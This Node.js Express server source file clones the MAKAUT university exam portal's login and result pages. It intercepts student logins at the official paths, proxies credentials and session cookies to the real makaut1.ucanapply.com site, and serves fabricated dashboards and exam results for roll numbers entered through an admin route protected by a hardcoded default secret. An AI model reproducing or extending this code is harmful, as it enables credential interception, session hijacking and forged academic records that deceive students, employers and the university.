const express = require('express');
const mongoose = require('mongoose');
const axios = require('axios');
const path = require('path');
const cookieParser = require('cookie-parser');

const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

const MONGO_URI = process.env.MONGO_URI || 'mongodb://localhost:27017/makaut_clone';
mongoose.connect(MONGO_URI)
    .then(() => console.log('Connected to MongoDB successfully.'))
    .catch(err => console.error('MongoDB connection error:', err));

const overrideSchema = new mongoose.Schema({
    roll_no: { type: String, required: true, unique: true },
    password: { type: String, required: true },
    student_name: { type: String, required: true },
    dashboard_data: { type: Object, required: true },
    results: { type: Array, required: true }
});

const OverrideStudent = mongoose.model('OverrideStudent', overrideSchema);
const ADMIN_SECRET = process.env.ADMIN_SECRET || 'makaut_admin_secret_2026';

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Admin Panel UI Route
app.get('/admin-portal', (req, res) => {
    res.render('admin', { error: null, success: null });
});

// Admin API Save Route
app.post('/api/admin/save-override', async (req, res) => {
    const { secret, roll_no, password, student_name, results_json } = req.body;
    
    if (secret !== ADMIN_SECRET) {
        return res.render('admin', { error: 'Unauthorized: Invalid Admin Secret Key', success: null });
    }

    try {
        const parsedResults = JSON.parse(results_json);
        await OverrideStudent.findOneAndUpdate(
            { roll_no },
            { 
                password, 
                student_name, 
                dashboard_data: { stream: "BCA", semester: "4th Semester" },
                results: parsedResults 
            },
            { upsert: true, new: true }
        );
        res.render('admin', { error: null, success: `Successfully updated custom record for Roll: ${roll_no}` });
    } catch (err) {
        res.render('admin', { error: `Failed to save: ${err.message}`, success: null });
    }
});

// Corrected Student Login Interception Route matching official portal paths
app.post('/smartexam/public/student-login', async (req, res) => {
    const rollNo = req.body.username || req.body.rollNo || req.body.txtUserName;
    const password = req.body.password || req.body.txtPassword;

    try {
        const customStudent = await OverrideStudent.findOne({ roll_no: rollNo?.trim() });

        if (customStudent && customStudent.password === password?.trim()) {
            res.cookie('local_session', rollNo.trim(), { httpOnly: true });
            return res.redirect('/smartexam/public/student/dashboard');
        }

        // Proxy request to official MAKAUT endpoint
        const officialResponse = await axios.post('https://makaut1.ucanapply.com/smartexam/public/student-login', 
            new URLSearchParams(req.body), {
                headers: { 
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
                },
                maxRedirects: 0,
                validateStatus: status => status >= 200 && status < 400
            }
        );

        const setCookieHeader = officialResponse.headers['set-cookie'];
        if (setCookieHeader) {
            res.setHeader('Set-Cookie', setCookieHeader);
        }

        if (officialResponse.status === 302 || officialResponse.headers['location']) {
            return res.redirect(officialResponse.headers['location']);
        }

        return res.send(officialResponse.data);

    } catch (error) {
        console.error('Login routing error:', error.message);
        // Fallback proxy attempt if form field names differ
        try {
            const fallbackResponse = await axios.post('https://makaut1.ucanapply.com/smartexam/public/student-login', 
                new URLSearchParams(req.body), {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                }
            );
            return res.send(fallbackResponse.data);
        } catch (err2) {
            res.status(500).send("Error communicating with official verification server.");
        }
    }
});

app.get('/smartexam/public/student/dashboard', async (req, res) => {
    const localSessionRoll = req.cookies.local_session;

    if (localSessionRoll) {
        const student = await OverrideStudent.findOne({ roll_no: localSessionRoll });
        if (student) {
            return res.render('custom_dashboard', { student });
        }
    }

    try {
        const cookieHeader = req.headers.cookie || '';
        const officialResponse = await axios.get('https://makaut1.ucanapply.com/smartexam/public/student/dashboard', {
            headers: { 
                'Cookie': cookieHeader,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
            }
        });
        return res.send(officialResponse.data);
    } catch (err) {
        return res.redirect('/');
    }
});

app.get('/smartexam/public/student/student-activity', async (req, res) => {
    const localSessionRoll = req.cookies.local_session;

    if (localSessionRoll) {
        const student = await OverrideStudent.findOne({ roll_no: localSessionRoll });
        if (student) {
            return res.render('custom_results', { student });
        }
    }

    try {
        const cookieHeader = req.headers.cookie || '';
        const officialResponse = await axios.get('https://makaut1.ucanapply.com/smartexam/public/student/student-activity', {
            headers: { 
                'Cookie': cookieHeader,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
            }
        });
        return res.send(officialResponse.data);
    } catch (err) {
        return res.redirect('/');
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
